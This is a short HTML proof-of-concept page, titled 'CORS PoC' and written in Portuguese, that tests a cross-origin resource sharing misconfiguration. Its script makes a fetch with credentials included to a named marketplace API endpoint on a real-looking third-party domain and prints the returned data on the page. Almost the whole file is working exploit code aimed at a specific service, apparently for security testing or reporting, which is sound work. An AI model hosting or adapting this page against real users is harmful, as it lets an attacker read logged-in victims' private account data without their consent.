<!doctype html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS PoC</title>
</head>
<body>
  <h2>CORS PoC</h2>
  <pre id="result">Testando...</pre>

  <script>
    fetch("https://marketplace-api.meupainelhost.uol.com.br/product?id=SEU_ID", {
      credentials: "include"
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("result").textContent = data;
    })
    .catch(error => {
      document.getElementById("result").textContent =
        "Erro: " + error;
    });
  </script>
</body>
</html>
